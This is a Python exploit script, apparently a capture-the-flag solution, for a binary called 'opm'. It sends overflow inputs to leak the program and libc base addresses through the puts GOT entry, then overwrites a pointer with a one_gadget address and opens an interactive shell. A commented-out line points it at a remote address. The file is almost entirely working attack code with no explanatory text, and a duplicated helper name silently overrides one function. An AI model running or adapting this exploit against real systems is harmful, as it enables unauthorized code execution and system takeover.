from PwnContext import *
if __name__ == '__main__':        
    context.terminal = ['tmux', 'splitw', '-h']  # I always use tmux
    context.log_level = 'debug'
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    st      = lambda delim,data         :ctx.sendthen(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
    sla     = lambda delim,data         :ctx.sendlinethen(str(delim), str(data)) 
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)
    def dbg(gdbscript='', *args, **kwargs):
        gdbscript = sym_ctx.gdbscript + gdbscript
        return ctx.debug(gdbscript, *args, **kwargs)
    
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    
    
    def addrole(name, punch):
        sl('A')
        ru('name:')
        sl(name)
        ru('punch?')
        sl(punch)
        
    def show():
        sl('S')
    
    context.log_level = 'debug' 
    #ctx.binary = change_ld('./opm', './ld-2.23.so')
    ctx.binary = './opm'
    #ctx.libc = './libc-2.23.so'
    ctx.io_sleep = 0.1
    rs()
    dbg('c')
    #rs(remote_addr = ('39.107.33.43', 13572))
    one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

    addrole('a'*0x30, '0')
    addrole('a'*0x30, '0')
    addrole('bbbb', '0') #d00
    addrole('c'*0x81, '0')
    addrole('c'*0x80+'\x54', '0'*0x7f+';'+'c')

    ru('<')
    base = uu64(ru('>')) - 0xb30
    info('prog base {}'.format(hex(base)))

    elf = ctx.binary
    elf.address = base

    addrole('a'*8+p64(elf.got['puts']), '0')
    addrole('aaaa', '0'*0x80)
    ru('<')
    puts_leak = uu64(ru('>'))

    libc = ctx.libc
    libc.address = 0
    libc.address = puts_leak - libc.sym['puts']

    info('libc base {}'.format(hex(libc.address)))

    addrole('a'*0x60+p64(libc.address + one[1]), '0')
    addrole('c'*0x80, '0')

    show()
    irt()